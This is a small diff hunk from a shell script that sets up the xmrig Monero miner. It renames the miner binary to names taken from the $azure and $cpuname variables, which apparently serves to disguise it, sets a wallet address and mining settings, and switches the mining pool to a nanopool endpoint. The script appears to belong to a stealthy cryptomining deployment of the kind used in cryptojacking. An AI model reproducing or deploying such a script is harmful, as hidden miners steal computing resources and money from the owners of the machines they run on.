@@ -14,7 +14,7 @@ rm -rf xmrig-$VERSION-linux-x64.tar.gz && cd xmrig-$VERSION
 mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
-POOL=pool.minexmr.com:6666
+POOL=xmr-us-west1.nanopool.org:14433
 USERNAME=85jtJsumYhUUcErXB18SvLWAAvSrSWWMUNt5JgPDSd4FQpVyAsL7b368s5mi1UPXaef95UYT8mp6WhoZRLLAGWS8R8P2udL
 ALGO=rx/0
 DONATE=1
